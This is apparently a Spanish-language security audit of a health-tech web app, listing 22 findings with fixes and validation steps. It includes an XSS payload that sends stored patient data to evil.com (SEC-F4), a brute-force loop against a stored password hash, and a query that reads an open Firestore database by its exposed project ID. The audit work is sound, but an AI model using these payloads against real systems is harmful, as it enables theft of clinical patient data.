# 🔒 Auditoría de Ciberseguridad E2E — Veridia HealthTech v5.2.0
## Ingeniero de Ciberseguridad Senior + DevSecOps Architect
### Fecha: 25/06/2026 · Clasificación: CONFIDENCIAL

---

## 📋 Contexto del Sistema

| Componente | Tecnología | Riesgo inherente |
|-----------|-----------|-----------------|
| **Frontend** | Vanilla JS, localStorage, PWA Service Worker | ALTO — toda la lógica y datos en el browser |
| **Backend** | Express.js, JWT (jsonwebtoken), bcrypt, Helmet | MEDIO — preparado pero INACTIVO |
| **DB primaria** | localStorage (5MB, sin cifrado nativo) | CRÍTICO — PII accesible desde DevTools |
| **DB sync** | Firebase Firestore (modo test) | CRÍTICO — sin Security Rules |
| **DB relacional** | PostgreSQL (preparada, sin uso) | BAJO — no expuesta |
| **APIs** | Gemini AI, USDA, OFF, TheMealDB | MEDIO — keys ahora en config pero client-side |
| **Datos sensibles** | PII pacientes: DNI, nombre, email, teléfono, datos clínicos, analíticas, patologías | CRÍTICO — regulado por RGPD/LOPD |

### Flujo de datos crítico:
```
Usuario → Login (client-side hash) → localStorage → Firestore sync
       → Datos pacientes (PII) almacenados sin cifrar en browser
       → Gemini AI recibe contexto clínico del paciente
       → Sin HTTPS enforcement en desarrollo
```

---

# 🎨 FRONTEND

## 🔴 PRIORIDAD 1º GRADO — Crítico / Mitigación Inmediata

### SEC-F1: Autenticación con hash criptográficamente débil
| | |
|---|---|
| **Amenaza** | `syncHash()` usa DJB2a + FNV-1a (hashes no criptográficos, diseñados para hash tables, NO para passwords). Un atacante con acceso a los hashes puede crackearlos por fuerza bruta en **segundos** con un script simple. Los hashes de 16 hex chars (64 bits) tienen colisiones frecuentes. |
| **Vector** | Abrir DevTools → Console → `AUTH_USERS` → ver emails + hashes → crackear offline |
| **Solución** | **Corto plazo:** Mover auth al backend con bcrypt ($2b$12). **Medio plazo:** Firebase Authentication (email/password + custom claims para RBAC). **Inmediato (parche):** Ofuscar AUTH_USERS — no exponerlos como variable global. |
| **Validación** | `typeof AUTH_USERS` en console del browser debe retornar `undefined`. Test de fuerza bruta contra syncHash: `for(let i=0;i<999999;i++){if(syncHash('nutri'+i)==='97c65021d55a79db')console.log('CRACKED:',i)}` — si tarda <1s, es vulnerable. |

### SEC-F2: PII sin cifrar en localStorage
| | |
|---|---|
| **Amenaza** | `localStorage.getItem('veridia_db')` retorna JSON plano con: nombres, DNIs, emails, teléfonos, direcciones, datos clínicos, analíticas, patologías de TODOS los pacientes. Cualquier extensión de browser, malware, o acceso físico al equipo expone estos datos. **Violación directa de RGPD Art. 32 (cifrado de datos personales).** |
| **Vector** | 1) Extensión maliciosa lee localStorage. 2) XSS almacena y exfiltra. 3) Equipo compartido → otro usuario lee datos. 4) Backup del browser incluye datos clínicos en texto plano. |
| **Solución** | Cifrar localStorage con AES-256-GCM usando Web Crypto API. Key derivada de password del usuario con PBKDF2 (100K iteraciones). El código ya tiene estructura preparada (`getCryptoKey` en auth.js). **Activar y completar la implementación.** |
| **Validación** | `JSON.parse(localStorage.getItem('veridia_db'))` debe retornar datos ilegibles (base64 de ciphertext), no JSON plano. |

### SEC-F3: Firestore en modo test (lectura/escritura abierta)
| | |
|---|---|
| **Amenaza** | Las Firestore Security Rules están en modo test: `allow read, write: if true`. **Cualquier persona con el projectId puede leer y escribir TODOS los datos de TODOS los pacientes.** El projectId (`nutrisuite-6e44a`) está visible en el código fuente. |
| **Vector** | `firebase.initializeApp({projectId:'nutrisuite-6e44a'})` → `db.collection('clinics').get()` → todos los datos |
| **Solución** | Deployar Firestore Security Rules restrictivas: solo el clinic owner autenticado puede leer/escribir sus datos. Ejemplo en la sección de implementación. |
| **Validación** | Desde otro proyecto Firebase, intentar `db.collection('clinics').get()` → debe retornar `PERMISSION_DENIED`. |

### SEC-F4: 214 innerHTML con riesgo de XSS persistente
| | |
|---|---|
| **Amenaza** | 214 asignaciones de innerHTML. Aunque existe `sanitize()` (127 calls), hay **87 innerHTML sin sanitize** que podrían renderizar HTML malicioso si un atacante logra inyectar datos en localStorage o Firestore. Con datos clínicos de pacientes, un XSS persistente podría exfiltrar TODA la base de datos. |
| **Vector** | 1) Inyectar `<img src=x onerror="fetch('https://evil.com/steal?d='+btoa(localStorage.getItem('veridia_db')))">` en un campo de paciente. 2) Ese dato se sincroniza a Firestore → llega a otro usuario → XSS ejecuta. |
| **Solución** | 1) Auditar los 87 innerHTML sin sanitize y añadir `sanitize()` a cada uno. 2) Implementar Content Security Policy (CSP) que bloquee inline scripts. 3) Usar `textContent` donde no se necesita HTML. |
| **Validación** | Crear paciente con nombre `<img src=x onerror=alert(1)>` → NO debe ejecutar alert. Verificar con `document.querySelectorAll('[onerror]').length === 0`. |

### SEC-F5: Gemini AI recibe PII sin consentimiento explícito
| | |
|---|---|
| **Amenaza** | `buildPatientContext()` envía nombre completo, edad, sexo, motivo de consulta, antecedentes, alergias, medicación, analíticas del paciente a la API de Google Gemini. Esto es una **transferencia internacional de datos personales de salud** sin consentimiento explícito del paciente ni base legal clara bajo RGPD. |
| **Vector** | Cumplimiento legal, no técnico. Pero la consecuencia técnica es que Google almacena datos clínicos de pacientes en sus servidores. |
| **Solución** | 1) Anonimizar datos antes de enviar a Gemini (reemplazar nombre por "Paciente", DNI por "XXXX", etc.). 2) Consentimiento explícito del paciente (checkbox RGPD ya existe — conectarlo al flujo de IA). 3) Documentar la base legal de la transferencia. |
| **Validación** | Interceptar request a Gemini en Network tab → el body NO debe contener nombre real, DNI, ni email del paciente. |

---

## 🟡 PRIORIDAD 2º GRADO — Fortalecimiento

### SEC-F6: Service Worker cachea datos sensibles
| | |
|---|---|
| **Amenaza** | El SW cachea todas las responses incluyendo las que contienen datos de pacientes de Firestore. Un atacante con acceso al dispositivo puede inspeccionar el cache del SW. |
| **Solución** | Excluir responses de APIs con datos sensibles del cache del SW. Solo cachear assets estáticos (JS, CSS, imágenes). |
| **Validación** | `caches.keys()` → inspeccionar cada cache → no debe contener responses con PII. |

### SEC-F7: Session timeout configurable por el usuario
| | |
|---|---|
| **Amenaza** | El usuario puede cambiar el timeout de sesión a 120 minutos. En un consultorio compartido, un equipo desbloqueado 2 horas expone datos de pacientes. |
| **Solución** | Máximo timeout = 30 min. No configurable por el usuario final — solo por admin. Lock screen obligatorio después de 5 min de inactividad. |
| **Validación** | `SESSION_TIMEOUT_MS` nunca debe superar 1800000 (30 min). |

### SEC-F8: Sin Content Security Policy (CSP)
| | |
|---|---|
| **Amenaza** | Sin CSP, cualquier script inyectado (XSS) puede ejecutar código arbitrario, hacer fetch a dominios externos, y cargar recursos maliciosos. |
| **Solución** | Añadir meta tag CSP en `<head>`: `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://www.gstatic.com; connect-src 'self' https://*.googleapis.com https://api.nal.usda.gov https://world.openfoodfacts.net https://www.themealdb.com; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com">` |
| **Validación** | DevTools → Console → cualquier intento de cargar script externo no whitelisted debe ser bloqueado. |

### SEC-F9: VERIDIA_CONFIG en localStorage legible
| | |
|---|---|
| **Amenaza** | `localStorage.getItem('veridia_api_config')` contiene la Gemini API key en texto plano. Un XSS o extensión maliciosa puede robarla. |
| **Solución** | Cifrar el config con una key derivada del hash de sesión del admin. Al cerrar sesión, el config cifrado es ilegible sin re-autenticarse. |
| **Validación** | `JSON.parse(localStorage.getItem('veridia_api_config'))` no debe contener keys legibles. |

---

## 🟢 PRIORIDAD 3º GRADO — Monitoreo y Buenas Prácticas

### SEC-F10: Audit log sin protección de integridad
| | |
|---|---|
| **Amenaza** | DB.auditLog puede ser modificado desde consola: `DB.auditLog = []`. Un usuario malicioso puede borrar evidencia de sus acciones. |
| **Solución** | 1) Firmar cada entrada de audit con HMAC. 2) Sync inmediato a Firestore (inmutable server-side). 3) Añadir checksum de integridad al array. |
| **Validación** | Modificar auditLog manualmente → al siguiente integrityCheck(), la app debe detectar la manipulación. |

### SEC-F11: Sin detección de manipulación de DB
| | |
|---|---|
| **Amenaza** | Un atacante puede modificar `DB.patients`, cambiar roles en `currentUser`, o añadir facturas falsas desde la consola. |
| **Solución** | Checksum de integridad del DB object, verificado periódicamente. Ya existe `integrityCheck()` — reforzar con firma HMAC del estado completo. |
| **Validación** | `DB.patients.push({...})` desde consola → al siguiente check, debe detectar el cambio no autorizado. |

### SEC-F12: Sin política de rotación de credenciales
| | |
|---|---|
| **Amenaza** | Los passwords de los 3 usuarios ERP no tienen expiración. La Gemini key no tiene rotación programada. |
| **Solución** | 1) Forzar cambio de password cada 90 días. 2) Alerta en SuperAdmin cuando la Gemini key tiene >180 días. 3) Registro de última rotación en VERIDIA_CONFIG. |
| **Validación** | SuperAdmin → APIs & Keys debe mostrar fecha de última actualización de cada key. |

---

# ⚙️ BACKEND

## 🔴 PRIORIDAD 1º GRADO — Crítico

### SEC-B1: Backend INACTIVO — autenticación inexistente en producción
| | |
|---|---|
| **Amenaza** | Toda la autenticación y autorización corre en el browser (client-side). Un atacante puede: 1) Modificar RBAC desde consola, 2) Acceder a datos sin login, 3) Escalar privilegios trivialmente. **En un sistema con datos clínicos, esto es un riesgo regulatorio CRÍTICO.** |
| **Solución** | **Fase 1 (inmediata):** Activar el backend Express como API proxy (ya preparado con JWT + bcrypt). **Fase 2:** Migrar auth a server-side. **Fase 3:** Firebase Auth con custom claims. |
| **Validación** | `curl http://api.veridia.tech/api/patients` sin JWT → debe retornar 401. Con JWT expirado → 401. Con JWT de secretaria → 403 en endpoints clínicos. |

### SEC-B2: CSP deshabilitado en Helmet
| | |
|---|---|
| **Amenaza** | `helmet({ contentSecurityPolicy: false })` — Helmet está instalado pero su feature más importante (CSP) está desactivada. Esto anula gran parte de la protección contra XSS server-side. |
| **Solución** | Configurar CSP específico para Veridia: permitir solo dominios conocidos (googleapis, USDA, OFF, TheMealDB). Bloquear eval, inline scripts no necesarios. |
| **Validación** | `curl -I https://api.veridia.tech` → response headers debe incluir `Content-Security-Policy`. |

### SEC-B3: CORS con wildcard en producción
| | |
|---|---|
| **Amenaza** | `CORS_ORIGIN=*` permite requests desde cualquier dominio. Un sitio malicioso puede hacer requests autenticados al backend si el usuario tiene sesión activa. |
| **Solución** | Restringir a dominios específicos: `CORS_ORIGIN=https://veridia.tech,https://app.veridia.tech`. Nunca `*` en producción. |
| **Validación** | `curl -H "Origin: https://evil.com" -I https://api.veridia.tech/api/health` → response NO debe incluir `Access-Control-Allow-Origin: https://evil.com`. |

---

## 🟡 PRIORIDAD 2º GRADO — Fortalecimiento

### SEC-B4: JWT secret débil y sin rotación
| | |
|---|---|
| **Amenaza** | `JWT_SECRET=nutrisuite_jwt_secret_change_in_production_2026` — el secret es legible, predecible, y está en el `.env` sin rotación. Si se filtra, todos los tokens pueden ser falsificados. |
| **Solución** | 1) Generar secret random: `node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"`. 2) Rotación cada 90 días con grace period para tokens existentes. 3) No commitear .env (ya en .gitignore). |
| **Validación** | `jwt.verify(token, 'nutrisuite_jwt_secret_change_in_production_2026')` con el secret viejo debe fallar después de rotación. |

### SEC-B5: SQL injection — uso de parameterized queries (BIEN)
| | |
|---|---|
| **Amenaza** | VERIFICADO: El backend usa `query('SELECT * FROM users WHERE email = $1', [email])` — queries parametrizadas. **No hay SQL injection directa.** |
| **Solución** | Mantener. Añadir test automatizado que detecte cualquier query con concatenación de strings. |
| **Validación** | `grep -rn "query(" backend/src/ | grep -v '\$[0-9]' | grep "'+\|\" +"` → debe retornar 0 resultados. |

### SEC-B6: Sin rate limiting por usuario (solo por IP)
| | |
|---|---|
| **Amenaza** | El rate limiter actual es por IP. En NAT/proxy, todos los usuarios de una red comparten el límite. Un usuario malicioso puede consumir el cupo de toda la clínica. |
| **Solución** | Rate limit por JWT user ID para endpoints autenticados. Mantener IP-based para login/registro. |
| **Validación** | Hacer 101 requests con el mismo JWT → request 101 debe retornar 429. |

### SEC-B7: Sin HTTPS redirect
| | |
|---|---|
| **Amenaza** | El backend no fuerza HTTPS. Datos clínicos podrían transmitirse en HTTP plano (man-in-the-middle). |
| **Solución** | `app.use((req, res, next) => { if (req.headers['x-forwarded-proto'] !== 'https' && process.env.NODE_ENV === 'production') return res.redirect(301, 'https://' + req.hostname + req.url); next(); });` |
| **Validación** | `curl -I http://api.veridia.tech` → debe retornar 301 a https://. |

---

## 🟢 PRIORIDAD 3º GRADO — Monitoreo

### SEC-B8: Logging sin estructura ni alertas
| | |
|---|---|
| **Amenaza** | Solo `console.log/error`. Sin correlación de requests, sin alertas de actividad sospechosa (brute force, acceso a datos masivos). |
| **Solución** | Winston con JSON format. Cada request tiene requestId. Alert si >10 failed logins en 5 min. Log de acceso a datos de pacientes (quién vio qué, cuándo). |
| **Validación** | `tail -f logs/app.log | jq '.level, .requestId, .userId'` → debe mostrar logs estructurados. |

### SEC-B9: Sin backup automático de PostgreSQL
| | |
|---|---|
| **Amenaza** | Si la DB se corrompe o el servidor se pierde, no hay recuperación. Con datos clínicos, esto puede tener consecuencias legales. |
| **Solución** | `pg_dump` automatizado cada 6 horas. Retención 30 días. Upload cifrado a S3/GCS. Verificación de restore semanal. |
| **Validación** | Restaurar último backup en DB de test → verificar que los datos están completos e idénticos. |

### SEC-B10: Preparación para auditoría RGPD/LOPD
| | |
|---|---|
| **Amenaza** | Al operar con datos de salud en la UE, Veridia está sujeta a RGPD Art. 9 (datos de categoría especial). Sin documentación de impacto (DPIA), sin registro de actividades de tratamiento, sin DPO designado. |
| **Solución** | 1) Documentar DPIA (Data Protection Impact Assessment). 2) Registro de actividades de tratamiento. 3) Política de privacidad visible al paciente. 4) Derecho de acceso, rectificación, eliminación (botones en la app). 5) Notificación de brechas en <72h. |
| **Validación** | Checklist AEPD (Agencia Española de Protección de Datos) completada. |

---

## 📊 RESUMEN EJECUTIVO

| Área | 🔴 Crítico | 🟡 Medio | 🟢 Bajo | Total |
|------|-----------|---------|---------|-------|
| **Frontend** | 5 | 4 | 3 | **12** |
| **Backend** | 3 | 4 | 3 | **10** |
| **TOTAL** | **8** | **8** | **6** | **22** |

### 🎯 Top 5 por urgencia:

1. **SEC-F3** — Firestore Security Rules (cualquiera puede leer TODOS los datos AHORA)
2. **SEC-F2** — Cifrar localStorage (PII en texto plano)
3. **SEC-F1** — Mover auth a server-side (hashes crackeables en segundos)
4. **SEC-B1** — Activar backend (auth client-side es decorativa)
5. **SEC-F5** — Anonimizar datos antes de enviar a Gemini (RGPD)

### Plan de acción inmediato (pre-beta):

| Acción | Esfuerzo | Impacto |
|--------|----------|---------|
| Deployar Firestore Security Rules | 30 min | Cierra SEC-F3 |
| Añadir CSP meta tag | 15 min | Mitiga SEC-F4, SEC-F8 |
| Anonimizar buildPatientContext() | 30 min | Mitiga SEC-F5 |
| Restricción CORS a dominios específicos | 5 min | Cierra SEC-B3 |
| Generar JWT secret random | 5 min | Cierra SEC-B4 |
